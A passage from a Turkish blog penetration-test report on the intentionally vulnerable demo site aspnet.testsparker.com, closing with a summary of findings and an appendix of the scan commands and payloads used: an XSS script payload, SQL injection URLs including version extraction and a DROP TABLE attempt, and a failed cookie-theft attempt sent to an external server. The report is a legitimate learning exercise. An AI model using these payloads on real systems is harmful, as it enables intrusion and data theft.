+<p><code>http://aspnet.testsparker.com/</code> adresindeki web uygulaması, SSL/TLS eksikliği, stored XSS, Error-Based SQL Injection, hassas veritabanı dosyası ifşası ve IIS hata mesajları yoluyla dizin ifşası gibi kritik güvenlik açıkları sergilemekte olup, kullanıcı verileri ve sistem bütünlüğü için ciddi riskler taşımaktadır. Orta önemdeki sorunlar (açıkta kalan dizinler ve hassas dosya ifşası), güvenlik duruşunu daha da zayıflatmaktadır. Viewstate, login sayfasında SQL Injection ve GuestbookList.aspx üzerinde cookie çalma denemelerinde güvenlik açığı bulunmaması olumlu bir durumdur, ancak diğer kritik sorunların giderilmesi için önlem alınması gerekmektedir.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="72-sonuç">7.2 Sonuç<a href="#72-sonuç" class="hash-link" aria-label="Direct link to 7.2 Sonuç" title="Direct link to 7.2 Sonuç">​</a></h3>
+<p>Sızma testi, dikkat edilmediği takdirde ciddi sonuçlara yol açabilecek birden fazla istismar edilebilir güvenlik açığını ortaya koymuştur. Önerilen düzeltmelerin uygulanmasıyla, bu proje web uygulamasının güvenliğini önemli ölçüde iyileştirebilir ve hassas verileri koruyabilir.</p>
+<p><em>Bu sızma testi sırasında zaman ve kapsam sınırlamaları nedeniyle derinlemesine analiz yapamasam da, sistemdeki potansiyel giriş noktalarını başarıyla tespit ettim ve olası saldırı yüzeylerine dair genel bir farkındalık kazandım.</em></p>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="8-ek-bilgiler">8. Ek Bilgiler<a href="#8-ek-bilgiler" class="hash-link" aria-label="Direct link to 8. Ek Bilgiler" title="Direct link to 8. Ek Bilgiler">​</a></h2>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="81-kullanılan-komutlar-ve-payloadlar">8.1 Kullanılan Komutlar ve Payload’lar<a href="#81-kullanılan-komutlar-ve-payloadlar" class="hash-link" aria-label="Direct link to 8.1 Kullanılan Komutlar ve Payload’lar" title="Direct link to 8.1 Kullanılan Komutlar ve Payload’lar">​</a></h3>
+<ul>
+<li><strong>Nmap</strong>: <code>nmap -sV -T4 aspnet.testsparker.com</code></li>
+<li><strong>Gobuster</strong>: <code>gobuster dir -u http://aspnet.testsparker.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,bak,config,txt</code></li>
+<li><strong>Ffuf</strong>: <code>ffuf -u http://aspnet.testsparker.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -e .aspx -fc 403,404 -t 50</code></li>
+<li><strong>Strings</strong>: <code>strings data.mdb</code></li>
+<li><strong>XSS Payload</strong>: <code>&lt;svg&gt;&lt;script&gt;confirm(1)&lt;/script&gt;&lt;/svg&gt;</code></li>
+<li><strong>SQL Injection Payload’lar</strong>:<!-- -->
+<ul>
+<li><code>http://aspnet.testsparker.com/Products.aspx?pId=asd</code></li>
+<li><code>http://aspnet.testsparker.com/Products.aspx?pId=user</code></li>
+<li><code>http://aspnet.testsparker.com/Products.aspx?pId=2&#x27; OR 1=1--</code></li>
+<li><code>http://aspnet.testsparker.com/Products.aspx?pId=4&#x27;+convert(int,(SELECT @@version))--</code></li>
+<li>Login sayfasında: <code>&#x27; OR &#x27;1&#x27;=&#x27;1</code>, <code>1; DROP TABLE users --</code> (başarısız)</li>
+</ul>
+</li>
+<li><strong>Cookie Çalma Denemesi</strong>: Azure sunucusu (<code>http://4.xxx.xxx.171:8000</code>) üzerinde Python HTTP sunucusu ile document.cookie çalma (başarısız)</li>
+</ul>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="83-i̇letişim-bilgileri">8.3 İletişim Bilgileri<a href="#83-i̇letişim-bilgileri" class="hash-link" aria-label="Direct link to 8.3 İletişim Bilgileri" title="Direct link to 8.3 İletişim Bilgileri">​</a></h3>
+<p>Daha fazla ayrıntı ve iletişim için: <a href="https://github.com/berkercelik" target="_blank" rel="noopener noreferrer">Berk Ali Erçelik</a></p></div><footer class="docusaurus-mt-lg"><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a title="Güvenlik açıkları, sızma testleri ve savunma teknikleri" class="tag_zVej tagRegular_sFm0" href="/b-log/blog/tags/siberguvenlik">Siber Güvenlik</a></li></ul></div></div><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class="col"><a href="https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2025-05-10/2025-05-10-testsparker-sizma-testi-aspnet.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><a class="pagination-nav__link pagination-nav__link--next" href="/b-log/blog/wazuh-ile-siem-ortami"><div class="pagination-nav__sublabel">Older post</div><div class="pagination-nav__label">Wazuh ile SIEM Ortamı Hazırlama</div></a></nav></main><div class="col col--2"><div class="tableOfContents_bqdL thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#özet" class="table-of-contents__link toc-highlight">Özet</a></li><li><a href="#1-giriş-ve-amaçlar" class="table-of-contents__link toc-highlight">1. Giriş ve Amaçlar</a><ul><li><a href="#11-amaç" class="table-of-contents__link toc-highlight">1.1 Amaç</a></li><li><a href="#12-kapsam" class="table-of-contents__link toc-highlight">1.2 Kapsam</a></li><li><a href="#13-metodoloji" class="table-of-contents__link toc-highlight">1.3 Metodoloji</a></li></ul></li><li><a href="#2-test-kapsamı-ve-yöntemleri" class="table-of-contents__link toc-highlight">2. Test Kapsamı ve Yöntemleri</a><ul><li><a href="#21-test-edilen-sistemler" class="table-of-contents__link toc-highlight">2.1 Test Edilen Sistemler</a></li><li><a href="#22-kullanılan-araçlar-ve-teknikler" class="table-of-contents__link toc-highlight">2.2 Kullanılan Araçlar ve Teknikler</a></li><li><a href="#23-test-türleri" class="table-of-contents__link toc-highlight">2.3 Test Türleri</a></li></ul></li><li><a href="#3-bulgular-ve-güvenlik-açıkları" class="table-of-contents__link toc-highlight">3. Bulgular ve Güvenlik Açıkları</a><ul><li><a href="#31-ssltls-eksikliği-kritik" class="table-of-contents__link toc-highlight">3.1 SSL/TLS Eksikliği (Kritik)</a></li><li><a href="#32-stored-cross-site-scripting-xss-in-guestbook-kritik" class="table-of-contents__link toc-highlight">3.2 Stored Cross-Site Scripting (XSS) in Guestbook (Kritik)</a></li><li><a href="#33-error-based-sql-injection-in-products-page-kritik" class="table-of-contents__link toc-highlight">3.3 Error-Based SQL Injection in Products Page (Kritik)</a></li><li><a href="#34-hassas-bilgi-i̇fşası---yapılandırma-dosyası-yüksek" class="table-of-contents__link toc-highlight">3.4 Hassas Bilgi İfşası - Yapılandırma Dosyası (Yüksek)</a></li><li><a href="#35-korunmasız-dizin-statics-orta" class="table-of-contents__link toc-highlight">3.5 Korunmasız Dizin (<code>/statics/</code>) (Orta)</a></li><li><a href="#36-hassas-bilgi-i̇fşası---veritabanı-dosyası-yüksek" class="table-of-contents__link toc-highlight">3.6 Hassas Bilgi İfşası - Veritabanı Dosyası (Yüksek)</a></li><li><a href="#37-iis-85-hata-mesajı-ile-dizin-i̇fşası-yüksek" class="table-of-contents__link toc-highlight">3.7 IIS 8.5 Hata Mesajı ile Dizin İfşası (Yüksek)</a></li><li><a href="#38-güvensiz-yönlendirmeler-düşük" class="table-of-contents__link toc-highlight">3.8 Güvensiz Yönlendirmeler (Düşük)</a></li><li><a href="#39-whois-ve-dns-üzerinden-bilgi-toplama-bilgilendirme" class="table-of-contents__link toc-highlight">3.9 WHOIS ve DNS Üzerinden Bilgi Toplama (Bilgilendirme)</a></li></ul></li><li><a href="#4-başarısız-olan-test-denemeleri" class="table-of-contents__link toc-highlight">4. Başarısız Olan Test Denemeleri</a><ul><li><a href="#41-viewstate-değeri-kontrolü" class="table-of-contents__link toc-highlight">4.1 Viewstate Değeri Kontrolü</a></li><li><a href="#42-sql-injection-denemesi-login-sayfası" class="table-of-contents__link toc-highlight">4.2 SQL Injection Denemesi (Login Sayfası)</a></li><li><a href="#43-documentcookie-çalma-denemesi-guestbooklistaspx" class="table-of-contents__link toc-highlight">4.3 Document.cookie Çalma Denemesi (GuestbookList.aspx)</a></li></ul></li><li><a href="#5-kanıtlar-ve-ekran-görüntüleri" class="table-of-contents__link toc-highlight">5. Kanıtlar ve Ekran Görüntüleri</a><ul><li><a href="#51-stored-xss-in-guestbook" class="table-of-contents__link toc-highlight">5.1 Stored XSS in Guestbook</a></li><li><a href="#52-error-based-sql-injection" class="table-of-contents__link toc-highlight">5.2 Error-Based SQL Injection</a></li><li><a href="#53-hassas-dosya-i̇fşası---yapılandırma-dosyası" class="table-of-contents__link toc-highlight">5.3 Hassas Dosya İfşası - Yapılandırma Dosyası</a></li><li><a href="#54-hassas-dosya-i̇fşası---veritabanı-dosyası" class="table-of-contents__link toc-highlight">5.4 Hassas Dosya İfşası - Veritabanı Dosyası</a></li><li><a href="#55-iis-85-dizin-i̇fşası" class="table-of-contents__link toc-highlight">5.5 IIS 8.5 Dizin İfşası</a></li><li><a href="#56-nmap-tarama-sonuçları" class="table-of-contents__link toc-highlight">5.6 Nmap Tarama Sonuçları</a></li><li><a href="#57-gobuster-sonuçları" class="table-of-contents__link toc-highlight">5.7 Gobuster Sonuçları</a></li><li><a href="#58-ffuf-sonuçları" class="table-of-contents__link toc-highlight">5.8 Ffuf Sonuçları</a></li></ul></li><li><a href="#6-etkiler-ve-öneriler" class="table-of-contents__link toc-highlight">6. Etkiler ve Öneriler</a><ul><li><a href="#61-ssltls-eksikliği" class="table-of-contents__link toc-highlight">6.1 SSL/TLS Eksikliği</a></li><li><a href="#62-stored-xss-in-guestbook" class="table-of-contents__link toc-highlight">6.2 Stored XSS in Guestbook</a></li><li><a href="#63-error-based-sql-injection" class="table-of-contents__link toc-highlight">6.3 Error-Based SQL Injection</a></li><li><a href="#64-hassas-bilgi-i̇fşası---yapılandırma-dosyası" class="table-of-contents__link toc-highlight">6.4 Hassas Bilgi İfşası - Yapılandırma Dosyası</a></li><li><a href="#65-hassas-bilgi-i̇fşası---veritabanı-dosyası" class="table-of-contents__link toc-highlight">6.5 Hassas Bilgi İfşası - Veritabanı Dosyası</a></li><li><a href="#66-iis-85-hata-mesajı-ile-dizin-i̇fşası" class="table-of-contents__link toc-highlight">6.6 IIS 8.5 Hata Mesajı ile Dizin İfşası</a></li><li><a href="#67-oturum-açma-ve-diğer-girdi-noktaları-yönlendirmeler" class="table-of-contents__link toc-highlight">6.7 Oturum Açma ve Diğer Girdi Noktaları, Yönlendirmeler</a></li><li><a href="#68-korunmasız-dizin-statics" class="table-of-contents__link toc-highlight">6.8 Korunmasız Dizin (<code>/statics/</code>)</a></li><li><a href="#not" class="table-of-contents__link toc-highlight">Not</a></li></ul></li><li><a href="#7-genel-değerlendirme-ve-sonuç" class="table-of-contents__link toc-highlight">7. Genel Değerlendirme ve Sonuç</a><ul><li><a href="#71-genel-güvenlik-durumu" class="table-of-contents__link toc-highlight">7.1 Genel Güvenlik Durumu</a></li><li><a href="#72-sonuç" class="table-of-contents__link toc-highlight">7.2 Sonuç</a></li></ul></li><li><a href="#8-ek-bilgiler" class="table-of-contents__link toc-highlight">8. Ek Bilgiler</a><ul><li><a href="#81-kullanılan-komutlar-ve-payloadlar" class="table-of-contents__link toc-highlight">8.1 Kullanılan Komutlar ve Payload’lar</a></li><li><a href="#83-i̇letişim-bilgileri" class="table-of-contents__link toc-highlight">8.3 İletişim Bilgileri</a></li></ul></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 b_log - Built with <a href="https://docusaurus.io/" target="_blank">
+      Docusaurus</a> , Berk Ali Erçelik</div></div></div></footer></div>
+</body>
+</html>
